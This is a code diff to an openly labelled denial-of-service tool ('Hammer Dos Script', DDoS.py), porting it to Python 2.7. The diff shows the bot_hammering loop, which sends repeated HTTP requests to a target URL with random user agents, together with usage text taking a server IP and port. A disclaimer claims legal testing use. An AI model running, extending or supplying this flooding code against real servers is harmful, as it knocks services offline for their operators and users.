@@ -1,13 +1,20 @@
-#!/usr/bin/python3
+#!/usr/bin/env python
+
 # -*- coding: utf-8 -*-
 
-# python 3.3.2+ Hammer Dos Script v.1
+# python 2.7 or 3.3.2+ Hammer Dos Script v.1
 # by Can Yalçın
 # only for legal purpose
 
+from __future__ import print_function
 from queue import Queue
 from optparse import OptionParser
-import time, sys, socket, threading, logging, urllib.request, random
+import time, sys, socket, threading, logging, random
+
+try:
+    import urllib.request
+except ImportError:
+    import urllib
 
 def user_agent():
     global uagent
@@ -31,7 +38,10 @@ def my_bots():
 def bot_hammering(url):
     try:
         while True:
-            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
+            try:
+                req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
+            except AttributeError:
+                req = urllib.urlopen(urllib.Request(url, headers={'User-Agent': random.choice(uagent)}))
             print("\033[94mbot is hammering...\033[0m")
             time.sleep(.1)
     except:
@@ -71,7 +81,7 @@ def usage():
     print(''' \033[92m    DDoS.py Script v.1 http://www.canyalcin.com/
     It is the end user's responsibility to obey all applicable laws.
     It is just for server testing script. Your ip is visible. \n
-    usage : python3 DDoS.py [-s] [-p] [-t]
+    usage : python DDoS.py [-s] [-p] [-t]
     -h : help
     -s : server ip
     -p : port default 80
